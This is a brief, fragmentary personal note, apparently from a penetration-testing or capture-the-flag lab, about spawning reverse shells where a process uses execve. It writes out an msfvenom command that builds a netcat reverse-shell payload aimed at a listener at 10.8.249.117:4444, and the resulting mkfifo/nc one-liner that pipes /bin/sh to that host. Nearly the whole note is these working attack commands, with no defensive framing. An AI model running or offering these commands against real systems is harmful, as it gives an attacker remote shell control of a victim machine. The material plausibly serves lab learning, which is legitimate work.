 ## we can create reverse shells using this when you h ave a proces using execve 
 
 msfvenom -p cmd/unix/reverse_netcat lhost=10.8.249.117 lport=4444 R >tmp   
 
 it creates a  
 [[research on ]]
 mkfifo /tmp/dopc; nc 10.8.249.117 4444 0</tmp/dopc | /bin/sh >/tmp/dopc 2>&1; rm /tmp/dopc 